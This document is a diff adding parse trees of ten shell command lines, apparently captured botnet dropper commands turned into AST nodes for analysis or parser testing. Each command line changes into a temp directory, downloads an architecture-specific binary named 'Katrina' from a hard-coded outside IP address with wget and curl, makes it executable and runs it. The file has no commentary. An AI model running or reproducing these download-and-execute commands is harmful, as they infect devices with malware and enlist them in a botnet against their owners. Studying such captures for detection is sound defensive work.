@@ -1,0 +1,550 @@
+ListNode(lineno=2, pos=(12, 224), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 34), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  CommandNode(lineno=2, pos=(38, 45), parts=[
+    WordNode(lineno=2, pos=(38, 40), word='cd'),
+    WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  CommandNode(lineno=2, pos=(49, 57), parts=[
+    WordNode(lineno=2, pos=(49, 51), word='cd'),
+    WordNode(lineno=2, pos=(52, 57), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  CommandNode(lineno=2, pos=(61, 65), parts=[
+    WordNode(lineno=2, pos=(61, 63), word='cd'),
+    WordNode(lineno=2, pos=(64, 65), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  CommandNode(lineno=2, pos=(67, 116), parts=[
+    WordNode(lineno=2, pos=(67, 71), word='wget'),
+    WordNode(lineno=2, pos=(72, 116), word='http://167.99.204.242/Katrina113/Katrina.x86'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(116, 117)),
+  CommandNode(lineno=2, pos=(118, 170), parts=[
+    WordNode(lineno=2, pos=(118, 122), word='curl'),
+    WordNode(lineno=2, pos=(123, 125), word='-O'),
+    WordNode(lineno=2, pos=(126, 170), word='http://167.99.204.242/Katrina113/Katrina.x86'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(170, 171)),
+  CommandNode(lineno=2, pos=(171, 197), parts=[
+    WordNode(lineno=2, pos=(171, 174), word='cat'),
+    WordNode(lineno=2, pos=(175, 186), word='Katrina.x86'),
+    RedirectNode(lineno=2, output=
+      WordNode(lineno=2, pos=(188, 197), word='Katrina32'), pos=(187, 197), type='>'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(197, 198)),
+  CommandNode(lineno=2, pos=(198, 208), parts=[
+    WordNode(lineno=2, pos=(198, 203), word='chmod'),
+    WordNode(lineno=2, pos=(204, 206), word='+x'),
+    WordNode(lineno=2, pos=(207, 208), word='*'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(208, 209)),
+  CommandNode(lineno=2, pos=(209, 224), parts=[
+    WordNode(lineno=2, pos=(209, 220), word='./Katrina32'),
+    WordNode(lineno=2, pos=(221, 224), word='ssh'),
+  ]),
+])
+ListNode(lineno=3, pos=(225, 440), parts=[
+  CommandNode(lineno=3, pos=(225, 232), parts=[
+    WordNode(lineno=3, pos=(225, 227), word='cd'),
+    WordNode(lineno=3, pos=(228, 232), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(233, 235)),
+  CommandNode(lineno=3, pos=(236, 247), parts=[
+    WordNode(lineno=3, pos=(236, 238), word='cd'),
+    WordNode(lineno=3, pos=(239, 247), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(248, 250)),
+  CommandNode(lineno=3, pos=(251, 258), parts=[
+    WordNode(lineno=3, pos=(251, 253), word='cd'),
+    WordNode(lineno=3, pos=(254, 258), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(259, 261)),
+  CommandNode(lineno=3, pos=(262, 270), parts=[
+    WordNode(lineno=3, pos=(262, 264), word='cd'),
+    WordNode(lineno=3, pos=(265, 270), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(271, 273)),
+  CommandNode(lineno=3, pos=(274, 278), parts=[
+    WordNode(lineno=3, pos=(274, 276), word='cd'),
+    WordNode(lineno=3, pos=(277, 278), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(278, 279)),
+  CommandNode(lineno=3, pos=(280, 330), parts=[
+    WordNode(lineno=3, pos=(280, 284), word='wget'),
+    WordNode(lineno=3, pos=(285, 330), word='http://167.99.204.242/Katrina113/Katrina.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(330, 331)),
+  CommandNode(lineno=3, pos=(332, 385), parts=[
+    WordNode(lineno=3, pos=(332, 336), word='curl'),
+    WordNode(lineno=3, pos=(337, 339), word='-O'),
+    WordNode(lineno=3, pos=(340, 385), word='http://167.99.204.242/Katrina113/Katrina.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(385, 386)),
+  CommandNode(lineno=3, pos=(386, 413), parts=[
+    WordNode(lineno=3, pos=(386, 389), word='cat'),
+    WordNode(lineno=3, pos=(390, 402), word='Katrina.mips'),
+    RedirectNode(lineno=3, output=
+      WordNode(lineno=3, pos=(404, 413), word='Katrina32'), pos=(403, 413), type='>'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(413, 414)),
+  CommandNode(lineno=3, pos=(414, 424), parts=[
+    WordNode(lineno=3, pos=(414, 419), word='chmod'),
+    WordNode(lineno=3, pos=(420, 422), word='+x'),
+    WordNode(lineno=3, pos=(423, 424), word='*'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(424, 425)),
+  CommandNode(lineno=3, pos=(425, 440), parts=[
+    WordNode(lineno=3, pos=(425, 436), word='./Katrina32'),
+    WordNode(lineno=3, pos=(437, 440), word='ssh'),
+  ]),
+])
+ListNode(lineno=4, pos=(441, 656), parts=[
+  CommandNode(lineno=4, pos=(441, 448), parts=[
+    WordNode(lineno=4, pos=(441, 443), word='cd'),
+    WordNode(lineno=4, pos=(444, 448), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(449, 451)),
+  CommandNode(lineno=4, pos=(452, 463), parts=[
+    WordNode(lineno=4, pos=(452, 454), word='cd'),
+    WordNode(lineno=4, pos=(455, 463), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(464, 466)),
+  CommandNode(lineno=4, pos=(467, 474), parts=[
+    WordNode(lineno=4, pos=(467, 469), word='cd'),
+    WordNode(lineno=4, pos=(470, 474), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(475, 477)),
+  CommandNode(lineno=4, pos=(478, 486), parts=[
+    WordNode(lineno=4, pos=(478, 480), word='cd'),
+    WordNode(lineno=4, pos=(481, 486), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(487, 489)),
+  CommandNode(lineno=4, pos=(490, 494), parts=[
+    WordNode(lineno=4, pos=(490, 492), word='cd'),
+    WordNode(lineno=4, pos=(493, 494), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(494, 495)),
+  CommandNode(lineno=4, pos=(496, 546), parts=[
+    WordNode(lineno=4, pos=(496, 500), word='wget'),
+    WordNode(lineno=4, pos=(501, 546), word='http://167.99.204.242/Katrina113/Katrina.mpsl'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(546, 547)),
+  CommandNode(lineno=4, pos=(548, 601), parts=[
+    WordNode(lineno=4, pos=(548, 552), word='curl'),
+    WordNode(lineno=4, pos=(553, 555), word='-O'),
+    WordNode(lineno=4, pos=(556, 601), word='http://167.99.204.242/Katrina113/Katrina.mpsl'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(601, 602)),
+  CommandNode(lineno=4, pos=(602, 629), parts=[
+    WordNode(lineno=4, pos=(602, 605), word='cat'),
+    WordNode(lineno=4, pos=(606, 618), word='Katrina.mpsl'),
+    RedirectNode(lineno=4, output=
+      WordNode(lineno=4, pos=(620, 629), word='Katrina32'), pos=(619, 629), type='>'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(629, 630)),
+  CommandNode(lineno=4, pos=(630, 640), parts=[
+    WordNode(lineno=4, pos=(630, 635), word='chmod'),
+    WordNode(lineno=4, pos=(636, 638), word='+x'),
+    WordNode(lineno=4, pos=(639, 640), word='*'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(640, 641)),
+  CommandNode(lineno=4, pos=(641, 656), parts=[
+    WordNode(lineno=4, pos=(641, 652), word='./Katrina32'),
+    WordNode(lineno=4, pos=(653, 656), word='ssh'),
+  ]),
+])
+ListNode(lineno=5, pos=(657, 872), parts=[
+  CommandNode(lineno=5, pos=(657, 664), parts=[
+    WordNode(lineno=5, pos=(657, 659), word='cd'),
+    WordNode(lineno=5, pos=(660, 664), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(665, 667)),
+  CommandNode(lineno=5, pos=(668, 679), parts=[
+    WordNode(lineno=5, pos=(668, 670), word='cd'),
+    WordNode(lineno=5, pos=(671, 679), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(680, 682)),
+  CommandNode(lineno=5, pos=(683, 690), parts=[
+    WordNode(lineno=5, pos=(683, 685), word='cd'),
+    WordNode(lineno=5, pos=(686, 690), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(691, 693)),
+  CommandNode(lineno=5, pos=(694, 702), parts=[
+    WordNode(lineno=5, pos=(694, 696), word='cd'),
+    WordNode(lineno=5, pos=(697, 702), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(703, 705)),
+  CommandNode(lineno=5, pos=(706, 710), parts=[
+    WordNode(lineno=5, pos=(706, 708), word='cd'),
+    WordNode(lineno=5, pos=(709, 710), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(710, 711)),
+  CommandNode(lineno=5, pos=(712, 762), parts=[
+    WordNode(lineno=5, pos=(712, 716), word='wget'),
+    WordNode(lineno=5, pos=(717, 762), word='http://167.99.204.242/Katrina113/Katrina.arm4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(762, 763)),
+  CommandNode(lineno=5, pos=(764, 817), parts=[
+    WordNode(lineno=5, pos=(764, 768), word='curl'),
+    WordNode(lineno=5, pos=(769, 771), word='-O'),
+    WordNode(lineno=5, pos=(772, 817), word='http://167.99.204.242/Katrina113/Katrina.arm4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(817, 818)),
+  CommandNode(lineno=5, pos=(818, 845), parts=[
+    WordNode(lineno=5, pos=(818, 821), word='cat'),
+    WordNode(lineno=5, pos=(822, 834), word='Katrina.arm4'),
+    RedirectNode(lineno=5, output=
+      WordNode(lineno=5, pos=(836, 845), word='Katrina32'), pos=(835, 845), type='>'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(845, 846)),
+  CommandNode(lineno=5, pos=(846, 856), parts=[
+    WordNode(lineno=5, pos=(846, 851), word='chmod'),
+    WordNode(lineno=5, pos=(852, 854), word='+x'),
+    WordNode(lineno=5, pos=(855, 856), word='*'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(856, 857)),
+  CommandNode(lineno=5, pos=(857, 872), parts=[
+    WordNode(lineno=5, pos=(857, 868), word='./Katrina32'),
+    WordNode(lineno=5, pos=(869, 872), word='ssh'),
+  ]),
+])
+ListNode(lineno=6, pos=(873, 1088), parts=[
+  CommandNode(lineno=6, pos=(873, 880), parts=[
+    WordNode(lineno=6, pos=(873, 875), word='cd'),
+    WordNode(lineno=6, pos=(876, 880), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(881, 883)),
+  CommandNode(lineno=6, pos=(884, 895), parts=[
+    WordNode(lineno=6, pos=(884, 886), word='cd'),
+    WordNode(lineno=6, pos=(887, 895), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(896, 898)),
+  CommandNode(lineno=6, pos=(899, 906), parts=[
+    WordNode(lineno=6, pos=(899, 901), word='cd'),
+    WordNode(lineno=6, pos=(902, 906), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(907, 909)),
+  CommandNode(lineno=6, pos=(910, 918), parts=[
+    WordNode(lineno=6, pos=(910, 912), word='cd'),
+    WordNode(lineno=6, pos=(913, 918), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(919, 921)),
+  CommandNode(lineno=6, pos=(922, 926), parts=[
+    WordNode(lineno=6, pos=(922, 924), word='cd'),
+    WordNode(lineno=6, pos=(925, 926), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(926, 927)),
+  CommandNode(lineno=6, pos=(928, 978), parts=[
+    WordNode(lineno=6, pos=(928, 932), word='wget'),
+    WordNode(lineno=6, pos=(933, 978), word='http://167.99.204.242/Katrina113/Katrina.arm5'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(978, 979)),
+  CommandNode(lineno=6, pos=(980, 1033), parts=[
+    WordNode(lineno=6, pos=(980, 984), word='curl'),
+    WordNode(lineno=6, pos=(985, 987), word='-O'),
+    WordNode(lineno=6, pos=(988, 1033), word='http://167.99.204.242/Katrina113/Katrina.arm5'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(1033, 1034)),
+  CommandNode(lineno=6, pos=(1034, 1061), parts=[
+    WordNode(lineno=6, pos=(1034, 1037), word='cat'),
+    WordNode(lineno=6, pos=(1038, 1050), word='Katrina.arm5'),
+    RedirectNode(lineno=6, output=
+      WordNode(lineno=6, pos=(1052, 1061), word='Katrina32'), pos=(1051, 1061), type='>'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(1061, 1062)),
+  CommandNode(lineno=6, pos=(1062, 1072), parts=[
+    WordNode(lineno=6, pos=(1062, 1067), word='chmod'),
+    WordNode(lineno=6, pos=(1068, 1070), word='+x'),
+    WordNode(lineno=6, pos=(1071, 1072), word='*'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(1072, 1073)),
+  CommandNode(lineno=6, pos=(1073, 1088), parts=[
+    WordNode(lineno=6, pos=(1073, 1084), word='./Katrina32'),
+    WordNode(lineno=6, pos=(1085, 1088), word='ssh'),
+  ]),
+])
+ListNode(lineno=7, pos=(1089, 1304), parts=[
+  CommandNode(lineno=7, pos=(1089, 1096), parts=[
+    WordNode(lineno=7, pos=(1089, 1091), word='cd'),
+    WordNode(lineno=7, pos=(1092, 1096), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1097, 1099)),
+  CommandNode(lineno=7, pos=(1100, 1111), parts=[
+    WordNode(lineno=7, pos=(1100, 1102), word='cd'),
+    WordNode(lineno=7, pos=(1103, 1111), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1112, 1114)),
+  CommandNode(lineno=7, pos=(1115, 1122), parts=[
+    WordNode(lineno=7, pos=(1115, 1117), word='cd'),
+    WordNode(lineno=7, pos=(1118, 1122), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1123, 1125)),
+  CommandNode(lineno=7, pos=(1126, 1134), parts=[
+    WordNode(lineno=7, pos=(1126, 1128), word='cd'),
+    WordNode(lineno=7, pos=(1129, 1134), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1135, 1137)),
+  CommandNode(lineno=7, pos=(1138, 1142), parts=[
+    WordNode(lineno=7, pos=(1138, 1140), word='cd'),
+    WordNode(lineno=7, pos=(1141, 1142), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1142, 1143)),
+  CommandNode(lineno=7, pos=(1144, 1194), parts=[
+    WordNode(lineno=7, pos=(1144, 1148), word='wget'),
+    WordNode(lineno=7, pos=(1149, 1194), word='http://167.99.204.242/Katrina113/Katrina.arm6'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1194, 1195)),
+  CommandNode(lineno=7, pos=(1196, 1249), parts=[
+    WordNode(lineno=7, pos=(1196, 1200), word='curl'),
+    WordNode(lineno=7, pos=(1201, 1203), word='-O'),
+    WordNode(lineno=7, pos=(1204, 1249), word='http://167.99.204.242/Katrina113/Katrina.arm6'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1249, 1250)),
+  CommandNode(lineno=7, pos=(1250, 1277), parts=[
+    WordNode(lineno=7, pos=(1250, 1253), word='cat'),
+    WordNode(lineno=7, pos=(1254, 1266), word='Katrina.arm6'),
+    RedirectNode(lineno=7, output=
+      WordNode(lineno=7, pos=(1268, 1277), word='Katrina32'), pos=(1267, 1277), type='>'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1277, 1278)),
+  CommandNode(lineno=7, pos=(1278, 1288), parts=[
+    WordNode(lineno=7, pos=(1278, 1283), word='chmod'),
+    WordNode(lineno=7, pos=(1284, 1286), word='+x'),
+    WordNode(lineno=7, pos=(1287, 1288), word='*'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1288, 1289)),
+  CommandNode(lineno=7, pos=(1289, 1304), parts=[
+    WordNode(lineno=7, pos=(1289, 1300), word='./Katrina32'),
+    WordNode(lineno=7, pos=(1301, 1304), word='ssh'),
+  ]),
+])
+ListNode(lineno=8, pos=(1305, 1520), parts=[
+  CommandNode(lineno=8, pos=(1305, 1312), parts=[
+    WordNode(lineno=8, pos=(1305, 1307), word='cd'),
+    WordNode(lineno=8, pos=(1308, 1312), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1313, 1315)),
+  CommandNode(lineno=8, pos=(1316, 1327), parts=[
+    WordNode(lineno=8, pos=(1316, 1318), word='cd'),
+    WordNode(lineno=8, pos=(1319, 1327), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1328, 1330)),
+  CommandNode(lineno=8, pos=(1331, 1338), parts=[
+    WordNode(lineno=8, pos=(1331, 1333), word='cd'),
+    WordNode(lineno=8, pos=(1334, 1338), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1339, 1341)),
+  CommandNode(lineno=8, pos=(1342, 1350), parts=[
+    WordNode(lineno=8, pos=(1342, 1344), word='cd'),
+    WordNode(lineno=8, pos=(1345, 1350), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1351, 1353)),
+  CommandNode(lineno=8, pos=(1354, 1358), parts=[
+    WordNode(lineno=8, pos=(1354, 1356), word='cd'),
+    WordNode(lineno=8, pos=(1357, 1358), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1358, 1359)),
+  CommandNode(lineno=8, pos=(1360, 1410), parts=[
+    WordNode(lineno=8, pos=(1360, 1364), word='wget'),
+    WordNode(lineno=8, pos=(1365, 1410), word='http://167.99.204.242/Katrina113/Katrina.arm7'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1410, 1411)),
+  CommandNode(lineno=8, pos=(1412, 1465), parts=[
+    WordNode(lineno=8, pos=(1412, 1416), word='curl'),
+    WordNode(lineno=8, pos=(1417, 1419), word='-O'),
+    WordNode(lineno=8, pos=(1420, 1465), word='http://167.99.204.242/Katrina113/Katrina.arm7'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1465, 1466)),
+  CommandNode(lineno=8, pos=(1466, 1493), parts=[
+    WordNode(lineno=8, pos=(1466, 1469), word='cat'),
+    WordNode(lineno=8, pos=(1470, 1482), word='Katrina.arm7'),
+    RedirectNode(lineno=8, output=
+      WordNode(lineno=8, pos=(1484, 1493), word='Katrina32'), pos=(1483, 1493), type='>'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1493, 1494)),
+  CommandNode(lineno=8, pos=(1494, 1504), parts=[
+    WordNode(lineno=8, pos=(1494, 1499), word='chmod'),
+    WordNode(lineno=8, pos=(1500, 1502), word='+x'),
+    WordNode(lineno=8, pos=(1503, 1504), word='*'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1504, 1505)),
+  CommandNode(lineno=8, pos=(1505, 1520), parts=[
+    WordNode(lineno=8, pos=(1505, 1516), word='./Katrina32'),
+    WordNode(lineno=8, pos=(1517, 1520), word='ssh'),
+  ]),
+])
+ListNode(lineno=9, pos=(1521, 1733), parts=[
+  CommandNode(lineno=9, pos=(1521, 1528), parts=[
+    WordNode(lineno=9, pos=(1521, 1523), word='cd'),
+    WordNode(lineno=9, pos=(1524, 1528), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1529, 1531)),
+  CommandNode(lineno=9, pos=(1532, 1543), parts=[
+    WordNode(lineno=9, pos=(1532, 1534), word='cd'),
+    WordNode(lineno=9, pos=(1535, 1543), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1544, 1546)),
+  CommandNode(lineno=9, pos=(1547, 1554), parts=[
+    WordNode(lineno=9, pos=(1547, 1549), word='cd'),
+    WordNode(lineno=9, pos=(1550, 1554), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1555, 1557)),
+  CommandNode(lineno=9, pos=(1558, 1566), parts=[
+    WordNode(lineno=9, pos=(1558, 1560), word='cd'),
+    WordNode(lineno=9, pos=(1561, 1566), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1567, 1569)),
+  CommandNode(lineno=9, pos=(1570, 1574), parts=[
+    WordNode(lineno=9, pos=(1570, 1572), word='cd'),
+    WordNode(lineno=9, pos=(1573, 1574), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1574, 1575)),
+  CommandNode(lineno=9, pos=(1576, 1625), parts=[
+    WordNode(lineno=9, pos=(1576, 1580), word='wget'),
+    WordNode(lineno=9, pos=(1581, 1625), word='http://167.99.204.242/Katrina113/Katrina.ppc'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1625, 1626)),
+  CommandNode(lineno=9, pos=(1627, 1679), parts=[
+    WordNode(lineno=9, pos=(1627, 1631), word='curl'),
+    WordNode(lineno=9, pos=(1632, 1634), word='-O'),
+    WordNode(lineno=9, pos=(1635, 1679), word='http://167.99.204.242/Katrina113/Katrina.ppc'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1679, 1680)),
+  CommandNode(lineno=9, pos=(1680, 1706), parts=[
+    WordNode(lineno=9, pos=(1680, 1683), word='cat'),
+    WordNode(lineno=9, pos=(1684, 1695), word='Katrina.ppc'),
+    RedirectNode(lineno=9, output=
+      WordNode(lineno=9, pos=(1697, 1706), word='Katrina32'), pos=(1696, 1706), type='>'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1706, 1707)),
+  CommandNode(lineno=9, pos=(1707, 1717), parts=[
+    WordNode(lineno=9, pos=(1707, 1712), word='chmod'),
+    WordNode(lineno=9, pos=(1713, 1715), word='+x'),
+    WordNode(lineno=9, pos=(1716, 1717), word='*'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1717, 1718)),
+  CommandNode(lineno=9, pos=(1718, 1733), parts=[
+    WordNode(lineno=9, pos=(1718, 1729), word='./Katrina32'),
+    WordNode(lineno=9, pos=(1730, 1733), word='ssh'),
+  ]),
+])
+ListNode(lineno=10, pos=(1734, 1949), parts=[
+  CommandNode(lineno=10, pos=(1734, 1741), parts=[
+    WordNode(lineno=10, pos=(1734, 1736), word='cd'),
+    WordNode(lineno=10, pos=(1737, 1741), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1742, 1744)),
+  CommandNode(lineno=10, pos=(1745, 1756), parts=[
+    WordNode(lineno=10, pos=(1745, 1747), word='cd'),
+    WordNode(lineno=10, pos=(1748, 1756), word='/var/run'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1757, 1759)),
+  CommandNode(lineno=10, pos=(1760, 1767), parts=[
+    WordNode(lineno=10, pos=(1760, 1762), word='cd'),
+    WordNode(lineno=10, pos=(1763, 1767), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1768, 1770)),
+  CommandNode(lineno=10, pos=(1771, 1779), parts=[
+    WordNode(lineno=10, pos=(1771, 1773), word='cd'),
+    WordNode(lineno=10, pos=(1774, 1779), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1780, 1782)),
+  CommandNode(lineno=10, pos=(1783, 1787), parts=[
+    WordNode(lineno=10, pos=(1783, 1785), word='cd'),
+    WordNode(lineno=10, pos=(1786, 1787), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1787, 1788)),
+  CommandNode(lineno=10, pos=(1789, 1839), parts=[
+    WordNode(lineno=10, pos=(1789, 1793), word='wget'),
+    WordNode(lineno=10, pos=(1794, 1839), word='http://167.99.204.242/Katrina113/Katrina.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1839, 1840)),
+  CommandNode(lineno=10, pos=(1841, 1894), parts=[
+    WordNode(lineno=10, pos=(1841, 1845), word='curl'),
+    WordNode(lineno=10, pos=(1846, 1848), word='-O'),
+    WordNode(lineno=10, pos=(1849, 1894), word='http://167.99.204.242/Katrina113/Katrina.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1894, 1895)),
+  CommandNode(lineno=10, pos=(1895, 1922), parts=[
+    WordNode(lineno=10, pos=(1895, 1898), word='cat'),
+    WordNode(lineno=10, pos=(1899, 1911), word='Katrina.m68k'),
+    RedirectNode(lineno=10, output=
+      WordNode(lineno=10, pos=(1913, 1922), word='Katrina32'), pos=(1912, 1922), type='>'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1922, 1923)),
+  CommandNode(lineno=10, pos=(1923, 1933), parts=[
+    WordNode(lineno=10, pos=(1923, 1928), word='chmod'),
+    WordNode(lineno=10, pos=(1929, 1931), word='+x'),
+    WordNode(lineno=10, pos=(1932, 1933), word='*'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1933, 1934)),
+  CommandNode(lineno=10, pos=(1934, 1949), parts=[
+    WordNode(lineno=10, pos=(1934, 1945), word='./Katrina32'),
+    WordNode(lineno=10, pos=(1946, 1949), word='ssh'),
+  ]),
+])
+ListNode(lineno=11, pos=(1950, 2162), parts=[
+  CommandNode(lineno=11, pos=(1950, 1957), parts=[
+    WordNode(lineno=11, pos=(1950, 1952), word='cd'),
+    WordNode(lineno=11, pos=(1953, 1957), word='/tmp'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1958, 1960)),
+  CommandNode(lineno=11, pos=(1961, 1972), parts=[
+    WordNode(lineno=11, pos=(1961, 1963), word='cd'),
+    WordNode(lineno=11, pos=(1964, 1972), word='/var/run'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1973, 1975)),
+  CommandNode(lineno=11, pos=(1976, 1983), parts=[
+    WordNode(lineno=11, pos=(1976, 1978), word='cd'),
+    WordNode(lineno=11, pos=(1979, 1983), word='/mnt'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1984, 1986)),
+  CommandNode(lineno=11, pos=(1987, 1995), parts=[
+    WordNode(lineno=11, pos=(1987, 1989), word='cd'),
+    WordNode(lineno=11, pos=(1990, 1995), word='/root'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1996, 1998)),
+  CommandNode(lineno=11, pos=(1999, 2003), parts=[
+    WordNode(lineno=11, pos=(1999, 2001), word='cd'),
+    WordNode(lineno=11, pos=(2002, 2003), word='/'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(2003, 2004)),
+  CommandNode(lineno=11, pos=(2005, 2054), parts=[
+    WordNode(lineno=11, pos=(2005, 2009), word='wget'),
+    WordNode(lineno=11, pos=(2010, 2054), word='http://167.99.204.242/Katrina113/Katrina.sh4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(2054, 2055)),
+  CommandNode(lineno=11, pos=(2056, 2108), parts=[
+    WordNode(lineno=11, pos=(2056, 2060), word='curl'),
+    WordNode(lineno=11, pos=(2061, 2063), word='-O'),
+    WordNode(lineno=11, pos=(2064, 2108), word='http://167.99.204.242/Katrina113/Katrina.sh4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(2108, 2109)),
+  CommandNode(lineno=11, pos=(2109, 2135), parts=[
+    WordNode(lineno=11, pos=(2109, 2112), word='cat'),
+    WordNode(lineno=11, pos=(2113, 2124), word='Katrina.sh4'),
+    RedirectNode(lineno=11, output=
+      WordNode(lineno=11, pos=(2126, 2135), word='Katrina32'), pos=(2125, 2135), type='>'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(2135, 2136)),
+  CommandNode(lineno=11, pos=(2136, 2146), parts=[
+    WordNode(lineno=11, pos=(2136, 2141), word='chmod'),
+    WordNode(lineno=11, pos=(2142, 2144), word='+x'),
+    WordNode(lineno=11, pos=(2145, 2146), word='*'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(2146, 2147)),
+  CommandNode(lineno=11, pos=(2147, 2162), parts=[
+    WordNode(lineno=11, pos=(2147, 2158), word='./Katrina32'),
+    WordNode(lineno=11, pos=(2159, 2162), word='ssh'),
+  ]),
+])
